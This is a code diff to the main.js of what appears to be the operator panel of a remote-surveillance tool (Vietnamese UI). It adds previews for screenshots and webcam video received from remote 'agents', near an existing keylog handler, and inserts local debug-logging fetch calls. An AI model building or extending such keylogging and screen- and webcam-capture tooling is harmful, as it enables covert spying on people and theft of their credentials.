@@ -68,6 +68,9 @@ const gateway = new Gateway({
         }, 100);
     },
     onDisconnected: () => {
+        // #region agent log
+        fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'main.js:70',message:'onDisconnected callback triggered',data:{lastCloseCode:gateway._lastCloseCode,isConnecting:autoConnectState.isConnecting,hasTriedDiscovery:autoConnectState.hasTriedDiscovery},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'E'})}).catch(()=>{});
+        // #endregion
         ui.warn("System", "Mất kết nối Gateway.");
         appState.isConnected = false;
         appState.agents = [];
@@ -80,15 +83,27 @@ const gateway = new Gateway({
         setTimeout(() => {
             if (!appState.isConnected && !autoConnectState.isConnecting) {
                 console.log(`[Auto] Attempting auto-reconnect...`);
+                // #region agent log
+                fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'main.js:82',message:'Auto-reconnect triggered from onDisconnected',data:{isConnecting:autoConnectState.isConnecting},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'E'})}).catch(()=>{});
+                // #endregion
                 autoConnect();
             }
         }, 3000);
     },
     onAuthSuccess: () => {
-         ui.log("System", "Đăng nhập thành công! Đang tải danh sách Agent...");
-         setTimeout(() => {
-             gateway.refreshAgents();
-         }, 500);
+        ui.log("System", "Đăng nhập thành công! Đang tải danh sách Agent...");
+        setTimeout(() => {
+            gateway.refreshAgents();
+        }, 500);
+        
+        // If on App_Menu page, trigger refreshAppList after auth
+        if (window.location.pathname.includes('App_Menu')) {
+            setTimeout(() => {
+                if (window.refreshAppList) {
+                    window.refreshAppList();
+                }
+            }, 1000);
+        }
     },
     onAgentListUpdate: (agentList) => {
         ui.log("System", `Cập nhật danh sách Agent: ${agentList.length} thiết bị.`);
@@ -111,6 +126,13 @@ const gateway = new Gateway({
     },
     onScreenshot: (base64Data, agentId) => {
         ui.log("Spy", `Nhận ảnh màn hình từ ${agentId}`);
+        
+        // Check if we're on screen_webcam page and display preview
+        if (window.displayImagePreview && window.location.pathname.includes('screen_webcam')) {
+            window.displayImagePreview(base64Data);
+        }
+        
+        // Also show in modal if available (for other pages)
         const modal = document.getElementById('image-modal');
         const img = document.getElementById('modal-img');
         
@@ -118,16 +140,23 @@ const gateway = new Gateway({
             img.src = "data:image/jpeg;base64," + base64Data;
             modal.classList.remove('hidden');
             modal.style.display = 'block';
-        } else {
+        } else if (!window.displayImagePreview) {
             console.log("%c[ẢNH]", "font-size: 50px; background-image: url(data:image/jpeg;base64," + base64Data + ")");
         }
     },
     onCamera: (videoData, agentId) => {
-        ui.log("Spy", `Nhận video từ ${agentId}, đang tải xuống...`);
-        const link = document.createElement('a');
-        link.href = "data:video/mp4;base64," + videoData;
-        link.download = `cam_${agentId}_${Date.now()}.mp4`;
-        link.click();
+        ui.log("Spy", `Nhận video từ ${agentId}`);
+        
+        // Check if we're on screen_webcam page and display preview
+        if (window.displayVideoPreview && window.location.pathname.includes('screen_webcam')) {
+            window.displayVideoPreview(videoData);
+        } else {
+            // Fallback to download if not on preview page
+            const link = document.createElement('a');
+            link.href = "data:video/mp4;base64," + videoData;
+            link.download = `cam_${agentId}_${Date.now()}.mp4`;
+            link.click();
+        }
     },
     onKeylog: (keyData, agentId) => {
         const keylogPanel = document.getElementById('keylog-panel');
@@ -194,6 +223,9 @@ window.help = () => {
 };
 
 async function autoConnect() {
+    // #region agent log
+    fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'main.js:219',message:'autoConnect() called',data:{isConnecting:autoConnectState.isConnecting,hasTriedDiscovery:autoConnectState.hasTriedDiscovery,existingWs:!!gateway.ws,wsReadyState:gateway.ws?.readyState},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'E'})}).catch(()=>{});
+    // #endregion
     if (autoConnectState.isConnecting || appState.isConnected) {
         return;
     }
